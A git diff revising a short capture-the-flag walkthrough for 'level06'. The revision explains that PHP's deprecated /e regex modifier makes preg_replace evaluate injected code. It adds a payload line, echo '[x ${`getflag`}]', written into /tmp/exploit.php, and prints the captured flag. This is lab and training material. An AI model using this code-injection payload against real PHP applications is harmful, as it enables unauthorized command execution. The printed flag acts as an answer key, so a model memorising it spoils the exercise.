@@ -17,19 +17,21 @@ scp -P 4242 level06@127.0.0.1:/home/user/level06/level06 .
 setresgid confirms that privilege escalation is possible
 
 ```shell
-vim /tmp/exploit.php
+cat levelo6.php
 ```
 
-Copy-paste exploit.php's content
+shows deprecated `\e` regex modifier, which indicates we can inject code in the string. preg_replace will perform the regex substitution then evaluate the code
 
 ```shell
-./level06 /tmp/exploit.php
+echo '[x ${`getflag`}]' > /tmp/exploit.php
 ```
-
-prints the content of the file
 
 ```shell
-cat level06.php
+./level06
 ```
 
-shows deprecated `\e` regex modifier, which indicates we can inject code in the string `https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier`
+gives flag:
+
+```shell
+wiok45aaoguiboiki2tuin6ub
+```
